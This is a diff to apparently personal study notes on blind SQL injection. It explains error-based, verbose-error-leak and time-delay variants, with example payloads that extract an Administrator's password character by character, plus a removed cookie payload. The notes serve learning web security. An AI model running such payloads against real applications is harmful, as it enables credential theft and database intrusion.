@@ -95,11 +95,20 @@ This query returns whether the first character of the password is larger than m.
 >You can use a python script to automate attacks like these
 
 **Variations of these challenges**
-- Error based - error messages may reveal something
+- **Error based** - error messages may reveal something
 	- Database errors (so we dont depend on if data returned is empty or not)
-		- Example payload: `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a` (NOTE: different DB's might require different syntax)
+		- **Example payload**: `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a` (NOTE: different DB's might require different syntax)
 		- You can see this is similar to normal conditional based SQLi, but we exploit `1/0` to cause DB error
+		
+- **Verbose Error Messages Leak**
+	- Yeah basically the error messages reveal too much, you know how this could be dangerous
+	- **Payload**: `CAST((SELECT example_column FROM example_table) AS int)`
+	- Example: with CAST keyword, if you cast a string to integer you may get the error:
+	- `ERROR: invalid input syntax for type integer: "Example data"`
+	- Where "Example Data" is the value of the column youre trying to leak
 
-username = 'administrator' AND SUBSTRING(password, 1, 1) < '0'
+- **Time Delays**
+	- Trigger time delays based on conditionals, which delays the HTTP response
+	- **Payload**: '; `IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay_amount}'--`
+	- The payload above is Microsoft db syntax
 
-TrackingId=D41rZWESyfuH5SiT' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTRING(password, 1, 1) < '0') THEN 1/0 ELSE 'a' END FROM users)='a;
